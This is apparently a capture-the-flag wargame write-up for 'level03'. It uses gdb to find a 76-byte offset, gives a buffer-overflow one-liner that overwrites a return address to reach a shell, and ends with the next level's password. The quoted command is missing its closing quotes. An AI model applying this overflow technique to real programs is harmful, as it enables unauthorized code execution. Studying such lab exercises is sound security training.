This level is little hard.

On running ./level03 we get nothing as output.

Looking at source code we see we need to give one argument whose length cannot be smaller than 4.

Just input any 4 character input and it will show "I'm so sorry, you're at 0x80484a4 and you want to be at 0x8048474"

Now run gdb and add breakpoint at 0x80484a4
Now input run AAAAA
(Because A is 41 in hex and is easily identifiable for debugging)

now we see that it values are copied from lower to higher address.
also we see there are 76 spaces to be filled before we could access 0x08048474

So we will run the program with a python script giving the input as below

./level03 $(python -c 'print "A"*76 + "\x74\x84\x04\x08"

this will get us the shell access to read level 4 pass

pass == nSwmULj2LpDnRGU2
